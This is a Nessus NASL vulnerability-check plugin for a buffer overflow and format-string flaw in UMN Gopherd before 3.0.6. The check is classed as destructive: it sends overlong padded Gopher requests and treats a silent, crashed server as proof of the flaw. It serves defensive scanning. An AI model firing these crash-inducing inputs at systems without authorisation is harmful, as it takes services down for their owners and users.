#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(16195);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2004-0561");
 script_bugtraq_id(8157, 12254);
 script_xref(name:"OSVDB", value:"55702");
 script_xref(name:"OSVDB", value:"55703");

 script_name(english:"UMN Gopherd < 3.0.6 Multiple Remote Vulnerabilities");
 script_summary(english:"Determines if gopherd can be used as a proxy");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a Gopher server that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the UMN Gopher server.

The remote version of the remote gopher server seems to be vulnerable
to various issues including a buffer overflow and format string, which 
may be exploited by an attacker to execute arbitrary code on the remote 
host with the privileges of the gopher daemon." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to UMN Gopherd 3.0.6 or newer" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 
script_end_attributes();
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely"); 
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/gopher",70);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#

include("global_settings.inc");
include('misc_func.inc');
include('http.inc');

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/gopher");
if ( ! port ) port = 70;
if ( ! get_port_state(port) ) exit(0);

soc = open_sock_tcp(port);
if ( ! soc ) exit(0);

send(socket:soc, data:'GET / HTTP/1.0\r\n\r\n');
buf = http_recv_headers3(socket:soc);
close(soc);
if ( strlen(buf) && "GopherWEB" >< buf)
{
 soc = open_sock_tcp(port);
 if ( ! soc ) exit(0);
 send(socket:soc, data:'g\t+' + crap(63) + '\t1\nnessus\n');
 r = recv(socket:soc, length:65535);
 if ( ! r ) exit(0);
 close(soc);

 soc = open_sock_tcp(port);
 if ( ! soc ) exit(0);
 send(socket:soc, data:'g\t+' + crap(70) + '\t1\nnessus\n');
 r = recv(socket:soc, length:65535);
 if ( ! r ) security_hole(port);
}

